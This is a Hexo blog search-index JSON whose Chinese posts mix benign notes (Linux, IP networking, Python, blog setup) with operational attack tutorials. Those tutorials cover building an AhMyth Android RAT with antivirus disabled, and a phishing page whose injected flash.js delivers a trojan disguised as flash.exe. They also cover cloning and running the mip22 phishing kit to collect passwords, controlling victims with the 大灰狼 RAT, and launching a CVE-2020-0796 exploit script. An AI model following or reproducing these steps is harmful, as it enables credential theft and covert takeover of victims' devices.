{"meta":{"title":"hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"12-02","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"12-02","excerpt":""},{"title":"#新建页面","text":"","path":"新建页面/index.html","date":"12-03","excerpt":""}],"posts":[{"title":"Linux的学习","text":"文件的组织 一、pwd显示当前目录的路径 二、which查看命令的可执行文件所在路径 linux下，每一条命令其实都对应一个可执行程序，在终端中输入命令，按回车的时候就是执行了对应的那个程序，which命令本身对应的程序也存在与linux中。 总的来说，一个命令就是一个可执行程序。 三、ls列出文件和目录","path":"2023/12/04/linux_stduy/","date":"12-04","excerpt":"","tags":[]},{"title":"","text":"","path":"2023/12/04/Linux_study/","date":"12-04","excerpt":"","tags":[]},{"title":"网络安全知识基础","text":"一、Windows IP 配置1. 以太网适配器计算机与外界连接网络是通过主机箱插入一块网络接口板。网络接口板又称通信适配器或网络适配器或网络接口卡NIC，简单的名称为‘网卡’。 2. 以太网有线网络 3. 虚拟网卡以太网适配器VMware Network Adapter VMnet1、 VMware Network Adapter VMnet8 4. 无线局域网适配器 WLAN（即是wifi） （1） ipv6 ​ 也被称为IPng（IP Next Generation），也就是下一代IP协议。 ipv6地址总长度为128比特，分为8组，每组为4个十六进制数的形式，每组十六进制数间隔。 例如：FC00:0000:130F:0000:0000:09C0:876A:130B ipv6地址缩写规则： 每组中的前导“0”都可以省略，即一组中全为0，则可以只写一个0，所以上述地址可写为：FC00:0:130F:0:0:9C0:876A:130B。 地址中包含的连续两个或多个均为0的组，可以用双冒号“::”来代替 所以上述地址又可以进一步简写为：FC00:0:130F::9C0:876A:130B。 需要注意的是，在一个IPv6地址中只能使用一次双冒号“::”（一般用于0最多的一段） （2） ipv4 本地ip地址，IPv4 全称为 Internet Protocol version 4，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP 地址是一个 32 位的二进制数，算下来其实也只有 2^32 个地址，这些地址中有分为 A、B、C、D、E 5 类 ip地址的表示 IP地址由32位二进制数组成，为了方便记忆，将IP地址32位进制数进行分段，每段8位，共4段，然后将没段8位二进制转换为十进制数，中间点号分割。 特殊ip地址 （a） 广播地址 一个子网内的所有网络接口都能收到此广播消息 直接广播：带目标网络号，主机地址二进制全为1的地址 有限广播：网络号和主机地址二进制全为1的地址（即255.255.255.255） （b）网络地址 主机地址二进制全为0的地址 如实际中常用的127.0.0.1，别名localhost 主要用于对本地回路测试及实现本地机器进程间的通信。 (3) 子网技术 子网掩码 子网掩码与 IP 地址相同，32位二进制数。对于子网掩码的取值，对应于 IP 地址，网络号和子网号的所有二进制位设置为1，主机号的所有二进制位设置为0。 子网掩码的表示方法 点分十进制：表示法与ip地址中相同 网络前缀标记法（网络地址位数）：从左到右连续的取网络号和子网号的位数来表示子网掩码。列如，一个子网掩码为255.255.0.0 的 B类网络地址 156.81.0.0，用网络前缀标记法表示为 156.81.0.0&#x2F;16。 (4)公网和私网 公网（外网) ip 公网地址也称为全球唯一IP地址，是指可以直接在Internet上访问的IP地址。这些地址由互联网注册机构分配，具有全球唯一性和全球可达性。 公网地址通常用于互联网上的服务器、路由器和其他网络设备。它们可以直接访问Internet上的其他设备，可以通过Internet进行通信和数据传输。 私网（内网) ip： 私网地址也称为局域网IP地址，是指在局域网内部使用的IP地址。它们不具有全球唯一性和全球可达性，只能在局域网内部使用。 私网地址通常用于组建局域网，例如家庭网络、企业内部网络、校园网络等。在局域网内部，可以通过私网地址进行设备间的通信和数据传输。但是，如果要访问Internet上的其他设备，必须通过路由器进行转发。 私网的3类ip地址范围 A类地址:10.0.0.0~10.255.255.255 B类地址:172.16.0.0~172.31.255.255 C类地址:192.168.0.0~192.168.255.255 二、IP访问过程 1. 云一层一层上传，包括多个路由器、基站，发送至想访问的公网ip 2. 静态ip由路由器分配ip 3. 动态ip 动态IP的原理： 动态IP（Dynamic IP Address）是由网络服务提供商（ISP）自动分配的一种IP地址，该IP地址一般具有较短的租用期限，因此每次重新连接网络时，其IP地址会发生变化。其原理是将一定数量的IP地址作为可用地址池，在进行动态IP地址分配的过程中，一般采用动态主机配置协议（DHCP）从地址池中选取一个可用地址与设备建立通信，并将该地址分配给设备，以使设备可以连接到互联网。 4. 当动态ip设置为静态ip时大概率是动态ip上不了网。（实际上什么情况都有可能发生，主要因路由器不同设置导致） 5. socks5协议是一种代理协议。Socks 5 协议工作在传输层 (Transport Layer) 与应用层 (Application Layer) 的中间, 提供了一种对应用层协议透明的代理服务。对于传输层协议仅支持 TCP 协议 6. OSI七层模型 OSI七层模型是一种网络协议参考模型，用于描述和规范计算机网络中不同层次的功能和交互关系。它包括以下七层： 1.物理层(Physical Layer):负责传输比特流，包括电器、光学和机械接口等物理特性。 常见协议:Ethernet,RS-232,USB,光纤等 2.数据链路层(Date Link Layer):负责在直接相连的节点之间传输帧，处理物理地址(MAC地址)和错误检测等。 常见协议:Ethernet(IEEE 802.3),PPP(点对点协议),HDLC(高级数据链路控制),ARP(地址解析协议)等 3.网络层(Network Layer):负责在不同网络之间传输数据包，处理逻辑地址（ip地址）和路由选择等。 常见协议:IP(Internet协议)，ICMP(Internet控制消息协议),IPsec(IP安全性协议),OSPF(开放最短路径优先协议)等 4.传输层(Transport Layer):负责端到端的可靠传输和流量控制，提供传输协议(如TCP、UDP) 常见协议:TCP(传输控制协议)，UDP(用户数据报协议),SCIP(流控制传输协议)等 5.会话层(Session Layer):负责建立、管理和终止会话，确保数据在通信系统中的同步。 常见协议:NetBIOS(网络基本输入输出系统),RPC(远程过程调用协议),SSH(安全外壳协议)等 6.表示层(Presentation Layer):负责数据的格式转换、数据加密和解密、数据压缩和解压缩等。 常见协议:ACSII码,JPEG(联合图像专家组),MPEG(动态图像压缩标准)等 7.应用层(Application Layer):负责应用程序之间的通信和数据交互，提供各种应用服务。 常见协议:HTTP(超文本传输协议),FTP(文件传输协议),SMTP(简单邮件传输协议),DNS(域名系统)等 每一层都有自己的功能和协议，通过不同层次之间的协同工作，实现了网路通信的可靠性和灵活性。 7. 路由器 路由器可作为一个网络的划分，同一个路由器下的设备是互通的 路由器表会记录要访问的ip 源ip，源MAC，目的ip,目的MAC称为四象限 交换机：集线器的作用，把多个设备的信号集中输出到路由器上（类似快递员的作用） 8. win操作系统和驱动 操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织和调度计算机的工作和资源的分配，以提供给用户和其它软件方便的接口和环境。 驱动是指驱动计算机里软件的程序，初始化和配置硬件，实现硬件的数据的接受和发送 9. NAT进行地址转换,等同于路由器，输出是由物理机ip输出，nat外的ip是访问不了nat内的服务器。 三、proxifier软件的使用(一)使用 在192.168.2.6:5244下载proxifier压缩文件，打开猫的局域网连接，打开proxifier,点击配置文件 点击编辑，如图设置，点击确定（ssh*;表示打开所有ssh开头的文件） 移除第一行，将default改为direct放行 重启proxifier，win+r，输入cmd，在命令行中输入ssh &#114;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#49;，会在proxifier出现记录（大概率访问失败） （二）说明 源ip过滤： ip.src &#x3D;&#x3D; 源ip地址 目的ip过滤 ： ip.dst &#x3D;&#x3D; 目的ip地址 DNS一般在78左右，50-130 下图红框所表示的意思：排序 时间戳 源Ip 目的ip 协议 DNS大小 数据包的简要信息","path":"2023/12/04/WangLuoAnQuanJiChu/","date":"12-04","excerpt":"","tags":[]},{"title":"Ahmyth的使用","text":"一、java环境安装 在192.168.2.6:5244找到jdk-8u341-windows-x64，并安装 安装完java后，新建文件夹安装jre 下载everything查看所有java文件，搜索java.exe，右键查看bin文件的路径。在路径下输入cmd,在命令行中输入 java -version查看java版本。 everything下载地址https://www.voidtools.com/zh-c n/ 在设置中找到病毒和威胁防护，关闭实时保护 java环境变量设置 右键计算机，点击属性，点击高级系统设置 点击环境变量，在用户变量双击path，查看是否有java的路径，有就删掉 找到系统变量的path，双击进入，添加java8（找到java8的bin文件，复制）的路线，并且上移至所有java路径的上方，点击确定→确定（环境变量） 按win+R,输入cmd,输入java -version确定是否是Java8环境 二、ahmyth的使用 在192.168.2.6:5244下载ahmyth 下载mumu模拟器6（12可能运行不了） 打开ahmyth.exe运行 port默认端口42474，可自己设置，不与默认端口冲突即可。设置好端口，点击listen 点击APK Builder，输入自己服务器的ip，以及之前设置的端口。 点击build，生成apk文件，路径会在下方框显示 找到apk文件，移入mumu模拟器中，运行apk文件，在victims点击open the lab，即可进行一些远程遥控的操作。","path":"2023/12/04/AhMyth_use/","date":"12-04","excerpt":"","tags":[]},{"title":"python_study","text":"第一章一、变量 变量：可以发生改变的一个量，变量是用来区分不同数据的，可以指向一个内存空间，帮我们储存一些数据 变量的命名规范 必须是数字或字母或下划线组成 不能数字开头，也不能是纯数字 不要能用python的关键字 不能用中文 不要太长 要有意义 推荐使用下划线命名或驼峰命名 name_of_teacher = &quot;樵夫&quot; NameOfTeacher = &quot;樵夫&quot; 二、常量 print(123) 可以把所有变量的字母变成大写就可以认为是常量 不存在绝对意义上的常量 三、数据类型 数据类型：区分不同的数据，不同数据类型应该有不同的操作 数字: +-* 整数：int 小数：float 文字： 展示 字符串：str(****) 表示方式：&#39;***&#39; ,&quot;****&quot;,&#39;&#39;&#39;***&#39;&#39;&#39; (英文状态下) 操作： + 左右两端必须是字符串，表示字符串两端连接操作 * 一个字符串只能乘以一个数字，表示字符串重复的次数 布尔(bool)：条件判断 布尔值主要有两个： True 真 False 假 四、最简单的用户交互 变量 = input(提示语) 首先会在屏幕中显示出提示语，用户输入内容，然后把用户输入的内容交给前面的变量 注意 ：input()得到的结果一定是字符串 py基础数据类型转化（想把xxx转化为谁，就用谁套起来） str → int : int(str) 内置函数type()可查看数据类型 五、条件判断(一)、if语句if语句的语法规则： 1234if 条件 ： 代码#如果条件成立就执行代码；如果不成立，就不执行#无论执行或不执行，都会进行这个循环之后的语句 12345if 条件 ： 代码1else : 代码2#如果条件一成立，执行代码1；如果条件二成立，执行代码2 1234567891011#if语句相互嵌套if 条件1 ： if 条件2 ……(可无线嵌套if) 代码1 else : 代码2 ……（else 代码i） else : 代码n 12345678if 条件 : 代码1elseif 条件2： 代码2……（elseif 条件i ： 代码i）else : 条件n (二)、while循环语句 while循环语句 1234#可以让我们的代码重复去执行while 条件 : 代码#过程：判断条件是否为真，如果是真，执行代码；然后再次判断条件，……直到条件为假循环结束 break和continue break :让当前循环立即停止，继续循环之后的语句（当某个数据会影响到最终结果时使用） continue :停止当前本次循环，继续执行下一次循环（一般用于处理无效数据） (三)、for循环语句123456#字符串是可迭代的for 变量 in 可迭代的东西 : 代码#把可迭代的东西中的每一项内容拿出来，挨个赋值给变量，每一次赋值都要执行一个循环体（代码）#平时用的多的是for循环，while循环用的多的是死循环while Ture： 搭配内置函数range() 123range(n) #从0数到n,不包含nrange(m,n) #从m数到n，不包含n（默认间隔为1）range(m,n,s) #从m数到n，每次间隔为s，不包含n (四)、pass关键字pass #代码占位,为了代码完整性防止报错，暂时先过掉 第二章一、基础数据类型 整数类型：int 操作：加减乘除，大小比较 浮点数：float 小数：数据范围是无限的，而计算机是一个二进制产品：0，1。所以计算机表示一个小数是会有误差的 bool 用来做条件判断的 取值范围：True(1),False(0) 在python中，所有非零数字都是True,零是False while 1 : #死循环，恒为真 在python中，所有的非空字符串都是True,空字符串都是False 综上，在python中所有表示空的东西都是Fasle,非空的东西都是True。 二、字符串（一）、字符串的格式化123456%s #字符串占位。也可以是小数，整数（万能）%d #整数占位#使用格式1. s=&quot;%s，%d……&quot;% (变量1，变量2，……) #只有一个变量，后面的括号可以不加2. s=&quot;&#123;&#125;，&#123;&#125;，……&quot;.format(变量1，变量2，……)3. s=f&quot;&#123;变量1&#125;，&#123;变量2&#125;，……&quot; （二）、字符串的索引和切片 *** 索引：按照位置提取元素 123s = &quot;我叫xyz&quot;print(s[1]) #会输出：叫 ---从0开始数数print(s[-1]) #会输出： z ---负号表示倒数，最后一个就是-1 切片：从一个字符串中提取一部分内容 语法：s[start:end] 从start到end进行切片，但是不取end，前开后闭区间，若要取最后一个元素，end处需输入n+1（n为元素个数） start从0开始，end从0结尾都可以不写0 可以给切片添加步长来控制切片的方向s[start:end:-1],从右往左取(右开左闭区间），不写就默认取1，从左往右取（左开右闭区间）。 步长设为i&gt;0（&lt;0),在切下来的片段下从左往右(从右往左）开始，每i个取左边（右边）第一个 12345678s = &quot;我叫xyzabc&quot;print(s[3:6]) #会输出：yza ---从索引3开始切片，到6结束，不会取第六个元素print(s[:6]) #从第0个到第6个print(s[3:]) #从第3个到最后一个，且包括最后一个print(s[-3:-1]) #会输出：abprint(s[-1:-3]) #没结果print(s[-1:-3:-1]) #会输出：cbprint(s[-1:-6:-2]) #会输出：cay (三)、字符串的常规操作 字符串的操作一般不会对原字符串产生影响，一般是返回一个新的字符串 字符串的大小写转换 1234567891011s = &quot;i have a dream&quot;#对第一个字母大写s1 = s.capitalize() # I have a dream#单词的首字母大写，电脑只能对一段连续的英文字母识别为单词s2 = s.title() # I Have A Dream#把所有字母改成大写字母（用于忽略大小写判断）s3 = s.upper() # I HAVE A DREAMn = &quot;I HAVE A DREAM&quot;#把所有字母变成小写n1 = n.lower() # i have a dream （四）、字符串的切割和替换 字符串strip() strip()去掉字符串左右两端的空白符（空格,\\t,\\n）。一般用于账户登录，避免用户在两端打出空格无法分辨 123s = &quot; 你好！ 我已经躲起 来了 &quot;s1 = s.strip()print(s1) #会输出：你好！ 我已经躲起来 来了 字符串的替换replace(old,mew) 1234567s = &quot;你好啊，我叫abc&quot;s1 = s.repalce(abc,xyz)print(s1) #输出：你好啊，我叫xyz#去掉所有空格a = &quot; x x xx x &quot;a1 = a.replace(&quot; &quot;,&quot;&quot;)print(a1) #输出：xxxxx 字符串的切割 split(str) 字符串切割 12345a = &quot;python_java_c_c#_javascript&quot;lst = a.split(_) #切割之后的结果会放在列表当中print(lst) #输出：[&#x27;python&#x27;,&quot;java&quot;,&#x27;c&#x27;,&#x27;c#&#x27;,&#x27;javascript&#x27;]lst = a.split(&quot;_java_&quot;)print(lst) #输出：[&#x27;python&#x27;,&#x27;c_c#_javascript&#x27;] （五）字符串的查找和判断 查找 find(str,beg&#x3D;0，end&#x3D;len(string)) 只查找第一次出现的位置 str–指定索引字符串 beg–开始索引，默认为0 end–结束索引，默认为字符串长度 如果包含子字符串返回开始的索引值，否则返回-1,即不包含寻找的str字符串 123s = &quot;你好啊，我叫周润发&quot;ret = s.find(&quot;周润发&quot;)print(ret) 判断 in用于该字符串是否存在（以及for循环的条件判断） * (返回值为 ture or false) 12s = &quot;你好啊，我叫周润发&quot;print(&quot;周润发111&quot; in s) startswith()用于判断字符串是否以xxx开头 * endswith()用于判断字符串是否以xxx结尾 isdight()用于判断字符串是否由整数组成 * （六）、字符串补充与总结 字符串拼接-join() 123lst = [&quot;123&quot;,&quot;456&quot;,&quot;789&quot;]s = &quot;_&quot;join(lst) print(s) #输出：123_456_789（输出的s是字符串类型） 总结 f“{变量}” 格式化一个字符串 索引和切片： 索引：从0开始的 [] 切片：s[start:end:step] end位置数据永远取不到 相关操作： 字符串操作对原字符串是不发生改变的 upper()在需要忽略大小写的时候 strip()去掉字符串左右两端的空白（空格，\\t,\\n） replace(old,new) 字符串替换 split() 对字符串进行切割 &quot;(用什么拼接)&quot;join(列表) 拼接一个列表中的内容成为新字符串 startswith(xxx) 判断字符串是否以xxx开头 len() 字符串长度（内置函数） 字符串的循环和遍历 12for c in s: print(c) 字符串的每一个字符 关于in 判断xxx是否在xxxxxx中出现 for循环","path":"2023/12/03/Python_study/","date":"12-03","excerpt":"","tags":[]},{"title":"图床搭建","text":"下载并安装node.js 下载并安装PicGo typora-偏好设置 进入GitHub，点击右上角头像，点击your repositories,点击new创建新库 点击右上角头像，点击setting→developer setting→personal 创建ssh picgo的GitHub设置 上传前将picgo设置为时间戳重命名 设置完成后进入typora偏好设置，点击验证图片上传","path":"2023/12/03/tuchuang/","date":"12-03","excerpt":"","tags":[]},{"title":"python安装","text":"进入192.168.2.6：5244搜索python，或者进入python官网下载python（需要和电脑版本一致的版本，右键计算机-属性查看） 安装python 打开安装包，勾选add python 3.8 to PATH,点击Customize installation进入下一页 全选，点击next 勾选add python to environmnet variables,选择安装路径（默认c盘）,点击install 测试python是否能调用 在python文件夹下，输入cmd 进入命令行，输入python 出现以下界面则安装成功","path":"2023/12/03/python/","date":"12-03","excerpt":"","tags":[]},{"title":"利用github搭博客","text":"准备前提 提前安装好(node.js)[https://nodejs.org/en] 左边的那个 提前安装好(GIt)[https://git-scm.com/downloads] 提前注册好一个github账号 如果文章图片没有显示，请自行挂代理 操作步骤 在本地找个目录放博客 在选定的目录下，右键Git Bash Here 使用nmp命令安装hexo，输入：1234npm install -g hexo-clihexo init blogcd bloghexo g 构建好的效果图 cd 进入这个目录 为了检测我们的网站雏形，分别按顺序输入以下三条命令： 1234hexo new test_my_sitehexo ghexo s#之后就可以访问127.0.0.1:4000访问blog了 配置ssh (1) cd~/.ssh检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。(2) ssh-keygen -t rsa -C “邮件地址”然后连续3次回车，最终会生成一个文件在用户目录下(3) 打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：(4) key填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容(5) 尝试ssh连接,测试是否成功ssh -T [git@github.com](mailto:git@github.com) # 注意邮箱地址不用改(6) 如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功： (7) 在选中的位置(blog目录下)打开cmd(以管理员身份) npm install hexo-deployer-git –save (8) 在上一个Git Bash Here还需要继续配置 12git config --global user.name “guangfa29”// 你的github用户名，非昵称git config --global user.email “1814124180@qq.com“// 填写你的github注册邮箱 准备上传代码 (1) github上新建一个存储库，命名为guangfa29(用户名).github.io (2) 编辑_config.yml文件，在最后改成这样 12345deploy:type: gitrepository: git@github.com:guangfa29/guangfa29.github.io.gitbranch: main#后三行需隔开一个tab的位置 (3) 注意保持格式，缩进不对，会导致一会儿，上传不成功 (4) 最后输入hexo d上传 (5) 在创建的存储库的设置中-pages-如图设置 hexo命令介绍12345678910111213141516hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令hexo version #查看Hexo的版本hexo generate #生成静态页面至public目录hexo s -g #生成并本地预览hexo d -g #生成并上传","path":"2023/12/03/daboke/","date":"12-03","excerpt":"","tags":[]},{"title":"钓鱼页面优化","text":"打开虚拟机安装phpstudy 打开phpstudy，启动Apache 点击网站，点击管理，打开根目录,删除www文件夹里文件 新建文本文档，改为index.html后缀 打开vscode（可在物理机中，在桌面新建文件夹，在文件夹下新建文本文档改为index.html）,通过vscode打开这个文件夹 输入 ！ 按tab键 在body输入&lt;h1&gt;……&lt;/h1&gt; 将代码复制到虚拟机index.html（以记事本打开） 打开浏览器，输入127.0.0.1，可看见输入内容以网页方式 在body后面插入&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt; 将整个代码复制如上步骤打开浏览器 下载flash文件（微信文件）放在虚拟机中www文件下，文件名改名为flash.js 右键点击flash点击编辑 将http后面改成自己的ip地址（php所在电脑），点击保存 如果不能保存，则在桌面新建文本文档改为flash.js 右键编辑复制进去，再放入www文件夹下 将木马程序改为flash.exe放在www文件夹下","path":"2023/12/03/diaoyuyemianyouhua/","date":"12-03","excerpt":"","tags":[]},{"title":"kali的钓鱼网站制作及大灰狼使用","text":"钓鱼网站的制作 下载kali（预留30g) 打开虚拟机kali 代码操作1234567891011121314151617输入 vim /etc/[proxychains4.conf](http://proxychains4.conf)一直按下↓最后一行 socks…… （打开猫→允许局域网打开→找到ipv4）改成 socks5 ip地址 port（端口）按Esc进入命令模式 按i进入插入模式 切忌使用Ctrl z，不用鼠标，在插入模式可用鼠标粘贴复制输入：wq！（保存）输入：q！（不保存退出）输入 proxychains4 git clone https://github.com/makdosx/mip22输入 ls（确认有mip22）输入 cd mip22输入 chmod +x ./*输入 proxychains4 -q bash ./[mip22.sh](http://mip22.sh)输入 1（出现有69种样板选一个）输入（所选择数字）输入 3 选择https网址复制，可看到访客记录（Ctrl c 终止程序） 返回桌面下mip22文件下data是密码，finger是访问地址 远程遥控 访问192.168.2:2544搜索下载大灰狼 查看物理机ipv4，在大灰狼中生成服务，将生成程序放入虚拟机中，即可通过大灰狼实现远程遥控等操作。","path":"2023/12/02/11.28/","date":"12-02","excerpt":"","tags":[]},{"title":"永恒之黑","text":"下载（微信文件）VMware安装虚拟机 下载（微信文件）CVE文件 查看虚拟机ipv4，将CVE文件在终端打开 执行代码 123python .\\CVE-2020-0796.py ipv4 #虚拟机pip3 install xxx -i http://mirrors.aliyun.com/pypi/simple/--trusted-host mirrors.aliyun.com #当缺少xxx文件时会提示,xxx文件后面字段可加速下载#当缺少文件时需重复上两段代码，直至第一段代码能成功运行","path":"2023/12/02/11.27/","date":"12-02","excerpt":"","tags":[]}],"categories":[],"tags":[]}